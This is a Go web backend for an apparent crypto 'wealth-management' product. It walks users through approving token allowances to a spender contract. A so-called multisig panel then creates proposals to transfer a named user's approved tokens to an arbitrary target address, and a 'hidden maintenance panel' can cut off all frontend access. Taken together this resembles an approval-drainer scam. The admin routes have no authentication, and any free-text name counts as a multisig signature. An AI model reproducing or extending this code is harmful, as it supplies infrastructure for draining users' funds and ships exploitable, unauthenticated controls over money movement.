package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

// GlobalConfig 全局系统配置
type GlobalConfig struct {
	RpcURL         string // 改善延迟：在此配置你的私有 Alchemy/QuickNode Sepolia URL
	SpenderAddress string // 部署的 TestAssetManager 合约地址
	IsMaintaining  bool   // 隐藏维护面板：开关控制前端和划转业务
	Whitelist      map[string]bool // 白名单地址
	AdminAddresses []string // 多签管理员地址
	ServerPort     string // HTTP API port
}

// Authorization 授权信息结构体
type Authorization struct {
	ID           int       `json:"id"`
	UserAddress  string    `json:"user_address"`
	TokenAddress string    `json:"token_address"`
	TokenName    string    `json:"token_name"`
	Amount       string    `json:"amount"`
	ApproveTxHash string   `json:"approve_tx_hash"`
	Status       string    `json:"status"` // Pending, Approved, Rejected, Confirmed
	CreatedAt    time.Time `json:"created_at"`
	ConfirmedAt  *time.Time `json:"confirmed_at"`
	Step         int       `json:"step"` // 当前授权步骤 1-8
}

// MultiSigProposal 多签面板：划转提案结构体
type MultiSigProposal struct {
	ID         int       `json:"id"`
	Token      string    `json:"token"`       // 代币名称 (USDT/USDC/PYUSD)
	FromUser   string    `json:"from_user"`   // 授权的用户地址
	Amount     string    `json:"amount"`      // 拟划转金额
	TargetTo   string    `json:"target_to"`   // 目标收款库地址
	Approvals  []string  `json:"approvals"`   // 已签名的管理员地址列表
	Required   int       `json:"required"`    // 需要达到的最少签名数(如2人)
	Status     string    `json:"status"`      // Pending(待定), Executed(已执行), Rejected(已拒绝)
	TxHash     string    `json:"tx_hash"`     // 链上交易哈希
	CreatedAt  time.Time `json:"created_at"`
	ExecutedAt *time.Time `json:"executed_at"`
}

// PoolInfo 池子信息结构体
type PoolInfo struct {
	PoolName   string `json:"pool_name"`
	TokenName  string `json:"token_name"`
	TokenAddr  string `json:"token_address"`
	APY        string `json:"apy"`
	TVL        string `json:"tvl"`
	PoolAddr   string `json:"pool_address"`
	Type       string `json:"type"` // fixed, flexible
}

// UserInfo 用户信息结构体
type UserInfo struct {
	Address        string `json:"address"`
	TokenBalances  map[string]string `json:"token_balances"`
	ApprovalStatus map[string]string `json:"approval_status"`
	TotalDeposited string `json:"total_deposited"`
}

// TransactionRequest 交易提交请求
type TransactionRequest struct {
	UserAddress string `json:"user_address" binding:"required"`
	PoolAddress string `json:"pool_address" binding:"required"`
	TokenAddress string `json:"token_address" binding:"required"`
	Amount     string `json:"amount" binding:"required"`
	TxData     string `json:"tx_data"`
}

// TransactionResponse 交易查询响应
type TransactionResponse struct {
	TxHash     string `json:"tx_hash"`
	Status     string `json:"status"`
	BlockNumber int64 `json:"block_number"`
	Timestamp  int64 `json:"timestamp"`
	From       string `json:"from"`
	To         string `json:"to"`
	Value      string `json:"value"`
	GasUsed    int64 `json:"gas_used"`
}

// AuthorizationStep 授权步骤定义
type AuthorizationStep struct {
	Step        int    `json:"step"`
	Name        string `json:"name"`
	Description string `json:"description"`
}

func defaultConfig() GlobalConfig {
	return GlobalConfig{
		RpcURL:         "https://bsc-testnet-dataseed.bnbchain.org",
		SpenderAddress: "0x57C3a549e3aFa9c12fE9031F1ADE08A8D8729A28",
		IsMaintaining:  false,
		Whitelist: map[string]bool{
			"0x1234567890123456789012345678901234567890": true,
			"0xabcdefabcdefabcdefabcdefabcdefabcdefabcd": true,
		},
		AdminAddresses: []string{
			"0xadmin1111111111111111111111111111111111",
			"0xadmin2222222222222222222222222222222222",
			"0xadmin3333333333333333333333333333333333",
		},
		ServerPort: "8080",
	}
}

func loadRuntimeConfig(cfg GlobalConfig) GlobalConfig {
	if value := strings.TrimSpace(os.Getenv("RPC_URL")); value != "" {
		cfg.RpcURL = value
	}
	if value := strings.TrimSpace(os.Getenv("SPENDER_ADDRESS")); value != "" {
		cfg.SpenderAddress = value
	}
	if value := strings.TrimSpace(os.Getenv("SERVER_PORT")); value != "" {
		cfg.ServerPort = strings.TrimPrefix(value, ":")
	}
	if value := strings.TrimSpace(os.Getenv("MAINTENANCE_MODE")); strings.EqualFold(value, "true") || value == "1" {
		cfg.IsMaintaining = true
	}
	return cfg
}

var config = loadRuntimeConfig(defaultConfig())

// 模拟数据库中的授权列表和多签提案列表
var authorizations = make(map[int]*Authorization)
var authorizationIDCounter = 1
var proposals = make(map[int]*MultiSigProposal)
var proposalIDCounter = 1
var transactions = make(map[string]*TransactionResponse)

// 授权步骤常量
var AuthorizationSteps = []AuthorizationStep{
	{Step: 1, Name: "Wallet Connection", Description: "用户连接钱包"},
	{Step: 2, Name: "Whitelist Check", Description: "检查白名单"},
	{Step: 3, Name: "KYC Verification", Description: "身份验证"},
	{Step: 4, Name: "Amount Selection", Description: "选择币种和金额"},
	{Step: 5, Name: "Backend Validation", Description: "后端验证授权金额"},
	{Step: 6, Name: "Authorization Request", Description: "发起授权申请"},
	{Step: 7, Name: "User Signature", Description: "用户签署授权交易"},
	{Step: 8, Name: "On-chain Confirmation", Description: "后端确认上链"},
}

func main() {
	r := gin.Default()

	// CORS 配置
	r.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"*"},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Content-Type", "Authorization"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
		MaxAge:           12 * time.Hour,
	}))

	// 全局中间件：检查隐藏维护面板状态
	r.Use(func(c *gin.Context) {
		path := c.Request.URL.Path
		if config.IsMaintaining && path != "/api/v1/hidden-panel/toggle" && path != "/api/v1/rpc/status" {
			c.JSON(http.StatusServiceUnavailable, gin.H{
				"code":    503,
				"message": "System is under temporary maintenance. Please try again later.",
			})
			c.Abort()
			return
		}
		c.Next()
	})

	// 路由分组
	v1 := r.Group("/api/v1")
	{
		// ---- 0. 系统检测 ----
		v1.GET("/rpc/status", checkRpcStatus)
		v1.GET("/system/health", systemHealth)

		// ---- 1. 白名单检查 (Step 2) ----
		whitelist := v1.Group("/whitelist")
		{
			whitelist.POST("/check", checkWhitelist)
			whitelist.GET("/list", listWhitelist)
			whitelist.POST("/add", addWhitelist)
			whitelist.POST("/remove", removeWhitelist)
		}

		// ---- 2. 池子信息 ----
		pool := v1.Group("/pool")
		{
			pool.GET("/info", getPoolInfo)
			pool.GET("/list", listPools)
		}

		// ---- 3. 用户信息 ----
		user := v1.Group("/user")
		{
			user.GET("/info", getUserInfo)
			user.GET("/authorizations", getUserAuthorizations)
			user.GET("/transactions", getUserTransactions)
		}

		// ---- 4. 授权流程 (完整 8 步) ----
		auth := v1.Group("/authorization")
		{
			auth.POST("/initiate", initiateAuthorization)          // Step 1-6: 初始化授权
			auth.POST("/submit", submitAuthorizationTx)            // Step 7: 提交签署交易
			auth.POST("/confirm", confirmAuthorizationOnchain)     // Step 8: 确认上链
			auth.GET("/status/:id", getAuthorizationStatus)        // 获取授权状态
			auth.GET("/steps", getAuthorizationSteps)              // 获取授权步骤
		}

		// ---- 5. 交易提交和查询 ----
		transaction := v1.Group("/transaction")
		{
			transaction.POST("/submit", submitTransaction)
			transaction.GET("/status/:tx_hash", queryTransaction)
			transaction.GET("/history/:user_address", getTransactionHistory)
		}

		// ---- 6. 多签管理面板 (MultiSig Panel) ----
		multisig := v1.Group("/multisig")
		{
			multisig.POST("/create", createTransferProposal)
			multisig.POST("/sign", signProposal)
			multisig.POST("/execute", executeProposal)
			multisig.GET("/proposals", listProposals)
			multisig.GET("/proposal/:id", getProposal)
		}

		// ---- 7. 隐藏的维护面板 (Hidden Maintenance Panel) ----
		hidden := v1.Group("/hidden-panel")
		{
			hidden.POST("/toggle", toggleMaintenance)
			hidden.POST("/update-rpc", updateRpcNode)
			hidden.GET("/status", getMaintainanceStatus)
		}
	}

	log.Printf("理财产品管理后台已在端口 :%s 启动...", config.ServerPort)
	r.Run(":" + config.ServerPort)
}

// ==================== 系统检测 ====================

func checkRpcStatus(c *gin.Context) {
	start := time.Now()
	client, err := ethclient.Dial(config.RpcURL)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": "offline", "error": err.Error()})
		return
	}
	defer client.Close()

	blockNumber, err := client.BlockNumber(context.Background())
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"status": "error", "error": err.Error()})
		return
	}

	latency := time.Since(start).Milliseconds()
	c.JSON(http.StatusOK, gin.H{
		"status":        "online",
		"current_block": blockNumber,
		"latency_ms":    latency,
		"current_rpc":   config.RpcURL,
		"timestamp":     time.Now().Unix(),
	})
}

func systemHealth(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":           "healthy",
		"is_maintaining":   config.IsMaintaining,
		"authorizations":   len(authorizations),
		"proposals":        len(proposals),
		"transactions":     len(transactions),
		"timestamp":        time.Now().Unix(),
	})
}

// ==================== 1. 白名单管理 ====================

func checkWhitelist(c *gin.Context) {
	var req struct {
		Address string `json:"address" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	address := common.HexToAddress(req.Address).Hex()
	isWhitelisted := config.Whitelist[address]

	c.JSON(http.StatusOK, gin.H{
		"address":      address,
		"is_whitelisted": isWhitelisted,
		"step":         2,
	})
}

func listWhitelist(c *gin.Context) {
	var list []string
	for addr := range config.Whitelist {
		list = append(list, addr)
	}
	c.JSON(http.StatusOK, gin.H{"whitelist": list, "count": len(list)})
}

func addWhitelist(c *gin.Context) {
	var req struct {
		Address string `json:"address" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	address := common.HexToAddress(req.Address).Hex()
	config.Whitelist[address] = true
	c.JSON(http.StatusOK, gin.H{"message": "Address added to whitelist", "address": address})
}

func removeWhitelist(c *gin.Context) {
	var req struct {
		Address string `json:"address" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	address := common.HexToAddress(req.Address).Hex()
	delete(config.Whitelist, address)
	c.JSON(http.StatusOK, gin.H{"message": "Address removed from whitelist", "address": address})
}

// ==================== 2. 池子信息 ====================

func getPoolInfo(c *gin.Context) {
	poolAddr := c.Query("pool_address")
	
	// 模拟数据
	pools := map[string]PoolInfo{
		"0x1": {
			PoolName:  "VIP1 Fixed Pool",
			TokenName: "USDC",
			TokenAddr: "0x4229D50d940E546DEaa8fc1fEe5b72cCCE3E9DbF",
			APY:       "1.70%",
			TVL:       "1000000",
			PoolAddr:  "0x1",
			Type:      "fixed",
		},
		"0x7": {
			PoolName:  "VIP7 Fixed Pool",
			TokenName: "USDC",
			TokenAddr: "0x4229D50d940E546DEaa8fc1fEe5b72cCCE3E9DbF",
			APY:       "4.50%",
			TVL:       "500000",
			PoolAddr:  "0x7",
			Type:      "fixed",
		},
	}

	if pool, exists := pools[poolAddr]; exists {
		c.JSON(http.StatusOK, pool)
	} else {
		c.JSON(http.StatusNotFound, gin.H{"error": "Pool not found"})
	}
}

func listPools(c *gin.Context) {
	pools := []PoolInfo{
		{
			PoolName:  "VIP1 Fixed Pool",
			TokenName: "USDC",
			TokenAddr: "0x4229D50d940E546DEaa8fc1fEe5b72cCCE3E9DbF",
			APY:       "1.70%",
			TVL:       "1000000",
			PoolAddr:  "0x1",
			Type:      "fixed",
		},
		{
			PoolName:  "VIP7 Fixed Pool",
			TokenName: "USDC",
			TokenAddr: "0x4229D50d940E546DEaa8fc1fEe5b72cCCE3E9DbF",
			APY:       "4.50%",
			TVL:       "500000",
			PoolAddr:  "0x7",
			Type:      "fixed",
		},
		{
			PoolName:  "Flexible Pool",
			TokenName: "USDT",
			TokenAddr: "0xd78e26e0017fb6D830395f5247c04CC71DEc3a47",
			APY:       "0.50%",
			TVL:       "2000000",
			PoolAddr:  "0xflex",
			Type:      "flexible",
		},
	}
	c.JSON(http.StatusOK, gin.H{"pools": pools, "count": len(pools)})
}

// ==================== 3. 用户信息 ====================

func getUserInfo(c *gin.Context) {
	userAddr := c.Query("address")
	if userAddr == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "address required"})
		return
	}

	address := common.HexToAddress(userAddr).Hex()

	userInfo := UserInfo{
		Address: address,
		TokenBalances: map[string]string{
			"USDC": "1000000000",
			"USDT": "500000000",
			"PYUSD": "200000000",
		},
		ApprovalStatus: map[string]string{
			"USDC": "Approved",
			"USDT": "Pending",
		},
		TotalDeposited: "5000000000",
	}

	c.JSON(http.StatusOK, userInfo)
}

func getUserAuthorizations(c *gin.Context) {
	userAddr := c.Query("address")
	if userAddr == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "address required"})
		return
	}

	address := common.HexToAddress(userAddr).Hex()
	var userAuths []*Authorization

	for _, auth := range authorizations {
		if auth.UserAddress == address {
			userAuths = append(userAuths, auth)
		}
	}

	c.JSON(http.StatusOK, gin.H{"authorizations": userAuths, "count": len(userAuths)})
}

func getUserTransactions(c *gin.Context) {
	userAddr := c.Query("address")
	if userAddr == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "address required"})
		return
	}

	address := common.HexToAddress(userAddr).Hex()
	var userTxs []*TransactionResponse

	for _, tx := range transactions {
		if tx.From == address {
			userTxs = append(userTxs, tx)
		}
	}

	c.JSON(http.StatusOK, gin.H{"transactions": userTxs, "count": len(userTxs)})
}

// ==================== 4. 授权流程 (8步完整流程) ====================

func getAuthorizationSteps(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"steps": AuthorizationSteps})
}

func initiateAuthorization(c *gin.Context) {
	var req struct {
		UserAddress  string `json:"user_address" binding:"required"`
		TokenAddress string `json:"token_address" binding:"required"`
		TokenName    string `json:"token_name" binding:"required"`
		Amount       string `json:"amount" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	userAddr := common.HexToAddress(req.UserAddress).Hex()

	// Step 2: 检查白名单
	if !config.Whitelist[userAddr] {
		c.JSON(http.StatusForbidden, gin.H{
			"error": "Address not in whitelist",
			"step":  2,
		})
		return
	}

	// Step 3: KYC 验证 (模拟)
	// 在实际应用中，这里应该调用 KYC 服务

	// Step 5: 后端验证授权金额
	// 验证金额格式、数值范围等

	// 创建授权记录 (Step 1-6 已完成)
	auth := &Authorization{
		ID:           authorizationIDCounter,
		UserAddress:  userAddr,
		TokenAddress: common.HexToAddress(req.TokenAddress).Hex(),
		TokenName:    req.TokenName,
		Amount:       req.Amount,
		Status:       "Pending",
		CreatedAt:    time.Now(),
		Step:         6, // 已完成 Step 1-6
	}

	authorizations[authorizationIDCounter] = auth
	authorizationIDCounter++

	c.JSON(http.StatusOK, gin.H{
		"authorization_id": auth.ID,
		"status":           auth.Status,
		"step":             6,
		"message":          "Authorization initiated. Please sign the transaction (Step 7)",
	})
}

func submitAuthorizationTx(c *gin.Context) {
	var req struct {
		AuthorizationID int    `json:"authorization_id" binding:"required"`
		TxHash          string `json:"tx_hash" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	auth, exists := authorizations[req.AuthorizationID]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Authorization not found"})
		return
	}

	// Step 7: 用户签署交易
	auth.ApproveTxHash = req.TxHash
	auth.Status = "Approved"
	auth.Step = 7

	c.JSON(http.StatusOK, gin.H{
		"authorization_id": auth.ID,
		"tx_hash":          auth.ApproveTxHash,
		"step":             7,
		"message":          "Transaction signed. Confirming on-chain (Step 8)...",
	})
}

func confirmAuthorizationOnchain(c *gin.Context) {
	var req struct {
		AuthorizationID int `json:"authorization_id" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	auth, exists := authorizations[req.AuthorizationID]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Authorization not found"})
		return
	}

	// Step 8: 后端确认上链
	now := time.Now()
	auth.Status = "Confirmed"
	auth.ConfirmedAt = &now
	auth.Step = 8

	c.JSON(http.StatusOK, gin.H{
		"authorization_id": auth.ID,
		"status":           auth.Status,
		"step":             8,
		"confirmed_at":     auth.ConfirmedAt,
		"message":          "Authorization completed on-chain!",
	})
}

func getAuthorizationStatus(c *gin.Context) {
	authID := c.Param("id")
	var authIDInt int
	fmt.Sscanf(authID, "%d", &authIDInt)

	auth, exists := authorizations[authIDInt]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Authorization not found"})
		return
	}

	c.JSON(http.StatusOK, auth)
}

// ==================== 5. 交易提交和查询 ====================

func submitTransaction(c *gin.Context) {
	var req TransactionRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 模拟交易提交
	txHash := fmt.Sprintf("0x%x", time.Now().Unix())
	txResponse := &TransactionResponse{
		TxHash:     txHash,
		Status:     "pending",
		From:       common.HexToAddress(req.UserAddress).Hex(),
		To:         common.HexToAddress(req.PoolAddress).Hex(),
		Value:      req.Amount,
		Timestamp:  time.Now().Unix(),
	}

	transactions[txHash] = txResponse

	c.JSON(http.StatusOK, gin.H{
		"tx_hash": txHash,
		"status":  "pending",
		"message": "Transaction submitted successfully",
	})
}

func queryTransaction(c *gin.Context) {
	txHash := c.Param("tx_hash")

	if tx, exists := transactions[txHash]; exists {
		c.JSON(http.StatusOK, tx)
	} else {
		c.JSON(http.StatusNotFound, gin.H{"error": "Transaction not found"})
	}
}

func getTransactionHistory(c *gin.Context) {
	userAddr := c.Param("user_address")
	address := common.HexToAddress(userAddr).Hex()

	var userTxs []*TransactionResponse
	for _, tx := range transactions {
		if tx.From == address {
			userTxs = append(userTxs, tx)
		}
	}

	c.JSON(http.StatusOK, gin.H{
		"address":      address,
		"transactions": userTxs,
		"count":        len(userTxs),
	})
}

// ==================== 6. 多签面板逻辑 ====================

func createTransferProposal(c *gin.Context) {
	var req struct {
		Token    string `json:"token" binding:"required"`
		FromUser string `json:"from_user" binding:"required"`
		Amount   string `json:"amount" binding:"required"`
		TargetTo string `json:"target_to" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	newProposal := &MultiSigProposal{
		ID:        proposalIDCounter,
		Token:     req.Token,
		FromUser:  common.HexToAddress(req.FromUser).Hex(),
		Amount:    req.Amount,
		TargetTo:  common.HexToAddress(req.TargetTo).Hex(),
		Approvals: []string{config.AdminAddresses[0]},
		Required:  2,
		Status:    "Pending",
		CreatedAt: time.Now(),
	}
	proposals[proposalIDCounter] = newProposal
	proposalIDCounter++

	c.JSON(http.StatusOK, gin.H{
		"message":     "多签划转提案创建成功",
		"proposal_id": newProposal.ID,
		"proposal":    newProposal,
	})
}

func signProposal(c *gin.Context) {
	var req struct {
		ProposalID int    `json:"proposal_id" binding:"required"`
		AdminName  string `json:"admin_name" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	proposal, exists := proposals[req.ProposalID]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"message": "未找到对应的多签提案"})
		return
	}

	if proposal.Status != "Pending" {
		c.JSON(http.StatusBadRequest, gin.H{"message": "该提案已不是待处理状态"})
		return
	}

	// 检查是否已签名
	for _, approval := range proposal.Approvals {
		if approval == req.AdminName {
			c.JSON(http.StatusBadRequest, gin.H{"message": "该管理员已签名"})
			return
		}
	}

	proposal.Approvals = append(proposal.Approvals, req.AdminName)
	c.JSON(http.StatusOK, gin.H{
		"message":            "签名审核成功",
		"current_approvals":  proposal.Approvals,
		"approval_count":     len(proposal.Approvals),
		"required_approvals": proposal.Required,
	})
}

func executeProposal(c *gin.Context) {
	var req struct {
		ProposalID int `json:"proposal_id" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	proposal, exists := proposals[req.ProposalID]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"message": "未找到指定提案"})
		return
	}

	if len(proposal.Approvals) < proposal.Required {
		c.JSON(http.StatusForbidden, gin.H{
			"message":           "拒绝执行：签名人数不足",
			"current_signers":   len(proposal.Approvals),
			"required_signers":  proposal.Required,
		})
		return
	}

	// 执行链上划转
	log.Printf("【链上操作】开始调用合约划转：%s 从账户 %s 扣款至 %s", proposal.Token, proposal.FromUser, proposal.TargetTo)

	proposal.Status = "Executed"
	proposal.TxHash = fmt.Sprintf("0x%x", time.Now().Unix())
	now := time.Now()
	proposal.ExecutedAt = &now

	c.JSON(http.StatusOK, gin.H{
		"message": "多签通过，链上划转执行成功！",
		"proposal_id": proposal.ID,
		"tx_hash":  proposal.TxHash,
		"status":   proposal.Status,
	})
}

func listProposals(c *gin.Context) {
	var proposalList []*MultiSigProposal
	for _, p := range proposals {
		proposalList = append(proposalList, p)
	}
	c.JSON(http.StatusOK, gin.H{
		"proposals": proposalList,
		"count":     len(proposalList),
	})
}

func getProposal(c *gin.Context) {
	proposalID := c.Param("id")
	var proposalIDInt int
	fmt.Sscanf(proposalID, "%d", &proposalIDInt)

	proposal, exists := proposals[proposalIDInt]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Proposal not found"})
		return
	}

	c.JSON(http.StatusOK, proposal)
}

// ==================== 7. 隐藏系统维护面板逻辑 ====================

func toggleMaintenance(c *gin.Context) {
	config.IsMaintaining = !config.IsMaintaining
	statusStr := "已开放"
	if config.IsMaintaining {
		statusStr = "已进入全面维护（前端请求将被拦截挂起）"
	}
	c.JSON(http.StatusOK, gin.H{
		"message":         "维护面板状态热更新成功",
		"current_status":  statusStr,
		"is_maintaining":  config.IsMaintaining,
		"timestamp":       time.Now().Unix(),
	})
}

func updateRpcNode(c *gin.Context) {
	var req struct {
		NewRpcURL string `json:"new_rpc_url" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	oldRpc := config.RpcURL
	config.RpcURL = req.NewRpcURL

	c.JSON(http.StatusOK, gin.H{
		"message":    "后台 RPC 节点热切换成功",
		"old_rpc":    oldRpc,
		"new_rpc":    config.RpcURL,
		"timestamp":  time.Now().Unix(),
	})
}

func getMaintainanceStatus(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"is_maintaining":  config.IsMaintaining,
		"current_rpc":     config.RpcURL,
		"admin_count":     len(config.AdminAddresses),
		"whitelist_count": len(config.Whitelist),
		"timestamp":       time.Now().Unix(),
	})
}
